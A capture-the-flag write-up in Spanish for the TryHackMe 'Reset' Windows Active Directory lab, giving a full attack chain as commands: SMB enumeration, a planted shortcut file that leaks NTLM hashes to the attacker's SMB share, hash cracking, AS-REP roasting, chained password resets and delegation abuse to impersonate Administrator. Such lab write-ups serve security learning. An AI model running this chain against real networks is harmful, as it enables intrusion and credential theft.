---
title: "Reset"
description: "Reset"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/resetui

# Fase de reconocimiento

Windows

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.252.53
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524011732.png)

## Reconocimiento de servicios

````
nmap -sCV -p53,135,139,445,636,3389,5985,49671,49673,49676,49702 10.10.252.53
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524012100.png)\##

## Enumeración SMB

````
crackmapexec smb 10.10.252.53
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524012545.png)

````
crackmapexec smb 10.10.252.53 --shares -u 'anonymous' -p ''
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524014000.png)

````
nmap --script "rdp-enum-encryption or rdp-ntlm-info" -p3389 -T4 10.10.252.53
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524013254.png)
Añadir DNS a /etc/host

# Fase de ataque

## SMB

Conectarse a el Share Data

````
smbclient -U 'anonymous' //10.10.252.53/Data
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524014641.png)
Montar

````
mount -t cifs "//10.10.252.53/Data" /mnt/montura
````

Como tenemos permisos de Escritura y Lectura
Robamos el NTLM

1. Copiamos una herramienta para crear un archivo a enviar al servidor

````
git clone https://github.com/Greenwolf/ntlm_theft
````

2. Ejecutamos

````
python3 ntlm_theft.py -g all -s 10.9.0.11 -f test
````

Ejemplo CSF

````
[Shell]
Command=2
IconFile=\\10.9.0.11\smbFolder\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
````

3. Copiamos los archivos al servidor
3. Nos ponemos en escucha

````
impacket-smbserver smbFolder $(pwd) -smb2support
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524030845.png)

## Crackear NTLM

Copiamos el hash
Crack

````
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524031138.png)
Comprobar credenciales

````
crackmapexec smb 10.10.252.53 -u 'AUTOMATE' -p 'Passw0rd1'
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524031935.png)

## Conectarse con credenciales

````
evil-winrm -i 10.10.252.53 -u 'AUTOMATE' -p 'Passw0rd1'
````

\[-\] ==pwned!==

# Privilege Escalation

Nos conectamos

````
rpcclient -U "AUTOMATE%Passw0rd1" 10.10.252.53
````

Enumeramos usuarios

````
	enumdomusers
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524033814.png)
Enumeramos usuarios Administradores

````
	enumdomgroups
	querygroupmem 0x200
	queryuser 0x45b
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524034526.png)
Encontramos 2 usuarios más aparte del Administrador

## Bloodhound

Se puede usar está herramienta para ver los privilegios de todos los usuarios del AD

1. Instalar Herramienta

````
apt install neo4j bloodhound
````

2. Para recolectar en la maquina victima nos descargamos un Data Collector

````
git clone https://github.com/dirkjanm/BloodHound.py
````

3. Ejecutamos para recolectar datos

````
python3 bloodhound.py -ns 10.10.252.53 --dns-tcp -d THM.CORP -u 'AUTOMATE' -p 'Passw0rd1' -c All --zip
````

4. Ejecutamos ne4j y BloodHound. Subimos el zip.

````
neo4j console
bloodhound
````

Podemos Observar que hay 3 usuarios con AS-REP Roastable Users, por lo que podemos ponseguir un ticket
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524164336.png)

## AS-REP Roastable Users

Conseguir TGT de los usuarios

````
impacket-GetNPUsers -request -format john -no-pass thm.corp/ERNESTO_SILVA
impacket-GetNPUsers -request -format john -no-pass thm.corp/TABATHA_BRITT
impacket-GetNPUsers -request -format john -no-pass thm.corp/LEANN_LONG
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524165503.png)
Crack

````
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524165656.png)
Encontramos 1 contraeña de TABATHA
Comprobar credenciales

````
crackmapexec smb 10.10.252.53 -u 'TABATHA_BRITT' -p 'marlboro(1985)'
````

## BloodHound

Encontramos un PATH para conseguir un usuario con más privielgios
Desde Transitive Object Control
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524171056.png)
El primer usuario podemos tenemos privilegios GenericAll sobre él. Le cambiamos la contraseña.

````
net rpc password "SHAWNA_BRAY" "pass123@" -U "THM.CORP"/"TABATHA_BRITT"%"marlboro(1985)" -S "haystack.thm.corp"
````

El segundo tenemos privilegios ForceChangePassword sobre él. Le cambiamos la contraseña.

````
net rpc password "CRUZ_HALL" "pass123@" -U "THM.CORP"/"SHAWNA_BRAY"%"pass123@" -S "haystack.thm.corp"
````

El último tenemos privilegios GenericWrite sobre él. Le cambiamos la contraseña.

````
net rpc password "DARLA_WINTERS" "pass123@" -U "THM.CORP"/"CRUZ_HALL"%"pass123@" -S "haystack.thm.corp"
````

Comprobar credenciales

````
crackmapexec smb 10.10.252.53 -u 'DARLA_WINTERS' -p 'pass123@'
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524171816.png)

Vemos que esté usuario tiene privilegios AllowdToDelegate sobre el controlador del AD.
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524172302.png)
Esto nos permite impersonar al Administrador y conseguir un GoldenTicket para acceder.

## TGT (Ticket Granting Ticket)

Podemos impersonar al Administrador por el Servicio CIFS

````
impacket-getST -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:pass123@"
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524173104.png)

````
export KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
````

````
impacket-wmiexec -k -no-pass Administrator@haystack.thm.corp
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240524173116.png)
\[+\] ==pwned!==
